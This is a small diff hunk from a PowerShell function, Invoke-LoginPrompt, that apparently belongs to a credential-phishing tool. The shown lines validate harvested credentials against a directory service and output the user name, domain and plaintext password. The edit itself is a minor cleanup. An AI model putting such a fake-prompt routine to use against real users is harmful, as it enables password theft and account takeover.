@@ -33,6 +33,6 @@ function Invoke-LoginPrompt{
         $DS.ValidateCredentials("$full", "$password") | out-null
         }
      
-     $output = $newcred = $cred.GetNetworkCredential() | select-object UserName, Domain, Password
+     $output = $cred.GetNetworkCredential() | select-object UserName, Domain, Password
      $output
 }
